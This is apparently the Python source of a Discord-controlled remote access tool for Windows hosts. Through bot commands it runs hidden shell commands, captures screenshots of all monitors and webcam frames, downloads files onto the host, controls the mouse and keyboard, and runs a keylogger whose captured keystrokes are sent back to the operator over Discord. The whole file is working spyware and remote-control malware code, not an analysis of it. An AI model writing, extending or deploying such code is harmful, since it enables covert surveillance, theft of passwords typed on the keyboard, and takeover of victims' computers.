import asyncio
import subprocess
import discord
from discord.ext import commands
import mss
import mss.tools
import pygame
import requests
import os
import tempfile
import pynput
import cv2


intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)


def load_token(path: str = "TOKEN") -> str:
    try:
        with open(path) as f:
            return f.readline().strip()
    except FileNotFoundError:
        raise SystemExit("❌ TOKEN file not found.")


def load_owner(path:str = "OWNER") -> int:
    try:
        with open(path) as f:
            return int(f.readline().strip())
    except FileNotFoundError:
        print("No owner found no message sending")

# ── Events ────────────────────────────────────────────────────────────────────


@bot.event
async def on_ready():
    await bot.add_cog(Mouse())
    await bot.add_cog(Keyboard())

    owner_id = load_owner()
    if owner_id:
        owner = await bot.fetch_user(owner_id)
        await owner.send("Bot ist an!")
    print(f"Logged in as {bot.user}")


# ── Helper ────────────────────────────────────────────────────────────────────

def send_chunked(text: str, chunk_size: int = 1900):
    """Yield code-block chunks from a long string."""
    for i in range(0, len(text), chunk_size):
        yield f"```bash\n{text[i:i + chunk_size]}\n```"


# ── Help Command ──────────────────────────────────────────────────────────────

@bot.command()
async def help(ctx: commands.Context, *, command_name: str = None):
    """Shows this help menu."""

    # ── Detailed help for a single command ───────────────────────────────────
    if command_name:
        cmd_obj = bot.get_command(command_name)
        if not cmd_obj:
            return await ctx.send(f"❌ Command `{command_name}` not found.")

        embed = discord.Embed(
            title=f"!{cmd_obj.qualified_name}",
            description=cmd_obj.help or "No description provided.",
            color=discord.Color.blurple()
        )
        if cmd_obj.aliases:
            embed.add_field(name="Aliases", value=", ".join(f"`!{a}`" for a in cmd_obj.aliases), inline=False)
        embed.add_field(name="Usage", value=f"`!{cmd_obj.qualified_name} {cmd_obj.signature}`", inline=False)
        embed.set_footer(text='Tip: Use "!help <command>" for more info on any command.')
        return await ctx.send(embed=embed)

    # ── Full help menu ────────────────────────────────────────────────────────
    embed = discord.Embed(
        title="📋 Command List",
        description="Use `!help <command>` to get more info on a specific command.",
        color=discord.Color.blurple()
    )

    categories = {
        "⚙️ General": ["cmd", "screenshot", "webcam", "sound", "download"],
        "🖱️ Mouse":   ["move", "set_position", "click", "hold", "release", "scroll"],
        "⌨️ Keyboard": ["type", "start_keylogger", "stop_keylogger", "current_pressed"],
    }

    for category, cmd_names in categories.items():
        lines = []
        for name in cmd_names:
            cmd_obj = bot.get_command(name)
            if cmd_obj:
                desc = cmd_obj.help or "No description."
                lines.append(f"`!{name}` — {desc}")
        if lines:
            embed.add_field(name=category, value="\n".join(lines), inline=False)

    embed.set_footer(text=f"{bot.user.name} • Use !help <command> for usage details")
    await ctx.send(embed=embed)


# ── Commands ──────────────────────────────────────────────────────────────────

@bot.command()
async def cmd(ctx: commands.Context, *args: str):
    """Run a shell command on the host machine."""
    await ctx.send(f"Executing: `{' '.join(args)}`")

    def _run():
        return subprocess.run(
            args,
            shell=True,
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
            creationflags=subprocess.CREATE_NO_WINDOW,
        )

    try:
        result = await asyncio.to_thread(_run)
        output = result.stdout or result.stderr or "No output."
        for chunk in send_chunked(output):
            await ctx.send(chunk)
    except Exception as e:
        await ctx.send(f"⚠️ Error: `{e}`")


@bot.command()
async def screenshot(ctx: commands.Context):
    """Capture and send a screenshot of all monitors."""
    def _capture():
        paths = []
        with mss.mss() as sct:
            for monitor in sct.monitors[1:]:
                img = sct.grab(monitor)
                with tempfile.NamedTemporaryFile(delete=False, suffix=".png") as tmp:
                    mss.tools.to_png(img.rgb, img.size, output=tmp.name)
                    paths.append(tmp.name)
        return paths

    for idx, path in enumerate(await asyncio.to_thread(_capture), 1):
        try:
            await ctx.send(f"Monitor {idx}", file=discord.File(path, filename=f"monitor_{idx}.png"))
        finally:
            os.unlink(path)


@bot.command()
async def webcam(ctx: commands.Context, index: int = 0):
    """Capture and send a frame from the webcam. Optionally specify a webcam index."""
    path = None
    def _capture():
        cap = cv2.VideoCapture(index)
        if not cap.isOpened():
            raise RuntimeError("Unable to open webcam.")
        ret, frame = cap.read()
        cap.release()
        with tempfile.NamedTemporaryFile(delete=False, suffix=".png") as tmp:
            cv2.imwrite(tmp.name, frame)
            return tmp.name

    try:
        path = await asyncio.to_thread(_capture)
        await ctx.send(file=discord.File(path, filename="webcam.png"))
    except Exception as e:
        await ctx.send(f"⚠️ Error: `{e}`")
    finally:
        if path:
            os.unlink(path)


@bot.command()
async def sound(ctx: commands.Context, url: str = None):
    """Play an MP3 on the host machine. Provide a URL or attach an MP3 file."""
    source = url
    if ctx.message.attachments:
        mp3s = [a.url for a in ctx.message.attachments if a.filename.endswith(".mp3")]
        if mp3s:
            source = mp3s[0]

    if not source:
        return await ctx.send("❓ Provide a URL or attach an MP3.")

    def _play(src: str):
        data = requests.get(src).content
        with tempfile.NamedTemporaryFile(delete=False, suffix=".mp3") as tmp:
            tmp.write(data)
            path = tmp.name
        try:
            pygame.mixer.init()
            pygame.mixer.music.load(path)
            pygame.mixer.music.set_volume(1)
            pygame.mixer.music.play()
            while pygame.mixer.music.get_busy():
                pygame.time.Clock().tick(10)
        finally:
            pygame.quit()
            os.unlink(path)

    try:
        await asyncio.to_thread(_play, source)
        await ctx.send("✅ Sound played.")
    except Exception as e:
        await ctx.send(f"⚠️ Error: `{e}`")


@bot.command(name="download")
async def download_file(ctx: commands.Context, url: str = None, path: str = None):
    """Download a file from a URL or attachment to the host machine."""
    dest = os.path.expandvars(path or r"%USERPROFILE%/Downloads")

    if ctx.message.attachments:
        for attachment in ctx.message.attachments:
            file_path = os.path.join(dest, attachment.filename)
            await attachment.save(file_path)
            await ctx.send(f"📥 Saved: `{attachment.filename}`")
        return

    if not url:
        return await ctx.send("❓ Provide a URL or attach a file.")

    filename = url.split("/")[-1].split("?")[0]
    file_path = os.path.join(dest, filename)

    def _download():
        return requests.get(url)

    try:
        response = await asyncio.to_thread(_download)
        if response.status_code == 200:
            with open(file_path, "wb") as f:
                f.write(response.content)
            await ctx.send(f"🔗 Downloaded: `{filename}`")
        else:
            await ctx.send(f"❌ HTTP {response.status_code}")
    except Exception as e:
        await ctx.send(f"⚠️ Error: `{e}`")


# ── Mouse Cog ─────────────────────────────────────────────────────────────────

class Mouse(commands.Cog):
    def __init__(self):
        self.controller = pynput.mouse.Controller()
        self.button = pynput.mouse.Button
        self.left   = self.button.left
        self.middle = self.button.middle
        self.right  = self.button.right
        self.holding = False

    def _resolve_button(self, which):
        b = which.lower() if isinstance(which, str) else which
        return (self.left   if b in (1, "left")   else
                self.right  if b in (2, "right")  else
                self.middle if b in (3, "middle") else None)

    @commands.command()
    async def move(self, ctx: commands.Context, x: int, y: int):
        """Move the mouse cursor by (x, y) pixels relative to its current position."""
        self.controller.move(x, y)
        await ctx.send(f"Mouse moved by ({x}, {y}).")

    @commands.command()
    async def set_position(self, ctx: commands.Context, x: int, y: int):
        """Move the mouse cursor to an absolute (x, y) screen position."""
        self.controller.move(-10000, -10000)
        self.controller.move(x, y)
        await ctx.send(f"Mouse position set to ({x}, {y}).")

    @commands.command()
    async def click(self, ctx: commands.Context, which_button: int | str = 1, amount: int = 1):
        """Click a mouse button. Use 1/left, 2/right, or 3/middle. Optionally specify click count."""
        self.controller.click(self._resolve_button(which_button), amount)
        await ctx.send(f"Clicked {amount}x.")

    @commands.command()
    async def hold(self, ctx: commands.Context, which_button: int | str = 1):
        """Hold down a mouse button. Use 1/left, 2/right, or 3/middle."""
        if self.holding:
            return await ctx.send("A button is already held.")
        self.controller.press(self._resolve_button(which_button))
        self.holding = True
        await ctx.send("Button held.")

    @commands.command()
    async def release(self, ctx: commands.Context, which_button: int | str = 1):
        """Release a held mouse button. Use 1/left, 2/right, or 3/middle."""
        if not self.holding:
            return await ctx.send("No button is held.")
        self.controller.release(self._resolve_button(which_button))
        self.holding = False
        await ctx.send("Button released.")

    @commands.command()
    async def scroll(self, ctx: commands.Context, y: int = 0, x: int = 0):
        """Scroll the mouse wheel by (y) vertical and (x) horizontal units."""
        self.controller.scroll(x, y)
        await ctx.send(f"Scrolled ({x}, {y}).")


# ── Keyboard Cog ──────────────────────────────────────────────────────────────

class Keyboard(commands.Cog):
    def __init__(self):
        self.controller = pynput.keyboard.Controller()
        self.keylogger_started = False
        self.listen: pynput.keyboard.Listener
        self.pressed = ""
        self.shift_active = False

    @commands.command()
    async def type(self, ctx: commands.Context, *, text: str):
        """Type a string of text on the host machine."""
        await asyncio.to_thread(self.controller.type, text)
        await ctx.send(f"Typed: \"{text}\"")

    @commands.command()
    async def start_keylogger(self, ctx: commands.Context, time_amount: int = 0):
        """Start the keylogger. Optionally pass a duration in seconds to auto-stop."""
        if self.keylogger_started:
            return await ctx.send("Keylogger already running.")

        self.pressed = ""
        self.listen = pynput.keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        self.listen.start()
        await ctx.send("Keylogger started.")

        if time_amount > 0:
            await asyncio.sleep(time_amount)
            self.listen.stop()
            await ctx.send(f"```{self.pressed}```")
            self.keylogger_started = False
            self.pressed = ""
            return

        self.keylogger_started = True

    @commands.command()
    async def stop_keylogger(self, ctx: commands.Context):
        """Stop the keylogger and print all captured keystrokes."""
        if not self.keylogger_started:
            return await ctx.send("Keylogger not running.")
        self.listen.stop()
        self.keylogger_started = False
        await ctx.send(f"Keylogger stopped.\n```{self.pressed}```")
        self.pressed = ""

    @commands.command()
    async def current_pressed(self, ctx: commands.Context):
        """Print all keystrokes captured so far without stopping the keylogger."""
        await ctx.send(f"```{self.pressed}```")

    def on_press(self, key):
        try:
            self.pressed += key.char.upper() if self.shift_active and key.char.isalpha() else key.char
        except AttributeError:
            special = str(key).replace("Key.", "")
            if special in ("shift", "shift_r"):
                self.shift_active = True
            elif special == "space":
                self.pressed += " "
            else:
                self.pressed += f"[{special}]"

    def on_release(self, key):
        if str(key).replace("Key.", "") in ("shift", "shift_r"):
            self.shift_active = False


# ── Entry Point ───────────────────────────────────────────────────────────────

bot.run(load_token())